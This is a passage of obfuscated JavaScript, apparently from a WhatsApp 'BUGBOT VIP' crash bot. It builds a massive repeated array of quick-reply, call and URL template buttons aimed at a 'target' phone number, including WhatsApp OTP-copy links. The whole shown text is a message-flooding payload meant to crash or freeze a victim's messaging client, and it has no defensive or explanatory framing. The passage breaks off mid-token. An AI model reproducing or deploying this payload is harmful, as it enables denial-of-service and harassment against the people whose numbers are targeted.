☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':'https://www.whatsapp.com/otp/copy/'+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+target}},{'urlButton':{'displayText':_0x284dbf(0x14a),'url':_0x284dbf(0x150)+target}},{'quickReplyButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x284dbf(0x14a),'id':''}},{'callButton':{'displayText':'☣️\x20BUGBOT\x20VIP\x20!!!\x20💣💥\x20☣️','phoneNumber':''+target}},{'callButton':{'displayText':_0x284dbf(0x14a),'phoneNumber':''+t